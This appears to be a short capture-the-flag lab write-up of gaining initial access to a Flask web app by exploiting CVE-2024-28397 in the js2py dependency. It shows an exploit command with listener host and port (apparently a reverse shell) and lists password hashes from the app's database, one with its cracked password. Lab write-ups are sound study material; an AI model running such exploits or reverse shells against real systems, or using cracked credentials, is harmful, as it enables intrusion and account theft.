## Initial Access
User:app
Method: http://10.129.42.21/run_code

CVE-2024-28397 

exploit.py --target http://10.129.42.21/run_code --lhost 10.10.15.202 --lport 1773



##Explanation

This give us initial access on the machine through js2py vulnerability.
This dependency is found when downloading the app (http://10.129.42.21/download)

Extracting the .zip file leads us into the full app codebase

We can see in "requirements.txt" the js2py which lead us to CVE-2024-28397.
Now that we know the internal structure of the victim, we assume that "users.db" is populated.

We find 2 hashes.
marco:649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove 
app:a97588c0e2fa3a024876339e27aeb42e:**UNKNOWN**

❯ tree app
app
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files

